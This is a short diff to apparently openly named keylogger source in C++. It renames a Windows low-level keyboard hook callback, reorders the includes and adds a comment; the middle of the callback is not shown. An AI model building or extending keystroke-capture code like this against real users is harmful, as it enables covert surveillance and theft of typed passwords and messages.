@@ -1,10 +1,10 @@
-#include "KeyLogger.h"
 #include "Network.h"
+#include "KeyLogger.h"
 #include <iostream>
 
 // them cac ham xu li keylogger vao day
 
-LRESULT __stdcall processKey(int nCode, WPARAM wParam, LPARAM lParam) {
+LRESULT __stdcall process_key(int nCode, WPARAM wParam, LPARAM lParam) {
 	if (nCode >= 0) {  // do not process key if < 0, as specified by documentation
 		PKBDLLHOOKSTRUCT key = reinterpret_cast<PKBDLLHOOKSTRUCT>(lParam);  
 		if (wParam == WM_KEYDOWN && nCode == HC_ACTION) {
@@ -31,5 +31,5 @@ LRESULT __stdcall processKey(int nCode, WPARAM wParam, LPARAM lParam) {
 		}
 	}
 	
-	return CallNextHookEx(nullptr, nCode, wParam, lParam);
+	return CallNextHookEx(nullptr, nCode, wParam, lParam); // pass the keypress event to the next hook in the system chain hook
 }
